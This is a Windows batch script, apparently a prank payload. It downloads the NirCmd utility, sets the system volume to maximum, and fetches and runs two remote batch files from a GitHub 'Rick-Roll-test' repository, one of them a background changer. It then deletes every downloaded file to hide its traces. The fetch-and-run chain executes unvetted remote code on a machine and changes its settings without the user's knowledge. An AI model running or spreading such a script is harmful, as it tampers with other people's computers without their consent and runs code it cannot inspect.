curl https://www.nirsoft.net/utils/nircmd-x64.zip -O
powershell Expand-Archive -Force nircmd-x64.zip C:\Users\%username%\Downloads\

C:\Users\%username%\Downloads\nircmd.exe setsysvolume 65535


curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/RickStart.bat -O RickStart.bat
start RickStart.bat

curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/BackgroundChanger.bat -O 
start BackgroundChanger.bat

cd C:\Users\%username%\Downloads\
del C:\Users\%username%\Downloads\nircmd.exe
del C:\Users\%username%\Downloads\nircmdc.exe
del C:\Users\%username%\Downloads\NirCmd.chm
del C:\Users\%username%\Downloads\RickStart.bat
del C:\Users\%username%\Downloads\BackgroundChanger.bat
del C:\Users\%username%\Downloads\nircmd-x64.zip
del C:\Users\%username%\Downloads\maxresdefault.jpg
